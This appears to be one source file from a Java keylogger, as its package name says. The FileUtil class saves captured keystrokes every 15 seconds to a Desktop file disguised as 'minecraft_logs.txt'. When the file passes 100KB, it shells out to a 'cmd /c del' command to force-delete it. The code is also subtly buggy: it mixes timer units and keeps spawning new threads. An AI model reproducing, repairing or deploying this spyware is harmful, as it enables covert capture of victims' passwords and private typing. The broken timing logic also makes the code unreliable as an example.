package me.obsidianbreaker.keylogger;

import java.io.IOException;
import java.nio.file.FileSystems;
import java.nio.file.Files;
import java.nio.file.Path;

public class FileUtil implements Runnable {
    private Thread service;

    public FileUtil() {
        service = new Thread(this, "Manage service");
        service.start();
    }

    @Override
    public void run() {
        long start = System.currentTimeMillis();
        while (true) {
            long elapsed = (System.currentTimeMillis() - start) / 1000;
            if (elapsed >= 15) { // Save File every time period
                try {
                    Keyboard.onSave();
                    start = System.nanoTime(); // Reset the timer
                    new FileUtil();
                    break;
                } catch (Exception e) {
                    e.printStackTrace();
                }

            try {
                Path r = FileSystems.getDefault().getPath(System.getProperty("user.home") + "\\Desktop\\minecraft_logs.txt");
                long m = Files.size(r);
                if (m > 100000) { //IF FILE SIZE IS > 100KB, DELETE B)
                    Runtime.getRuntime().exec("cmd /c del %USERPROFILE%\\Desktop\\minecraft_logs.txt /f /q");
                }
            } catch (IOException e) {
                e.printStackTrace();}
            }
        }
    }
}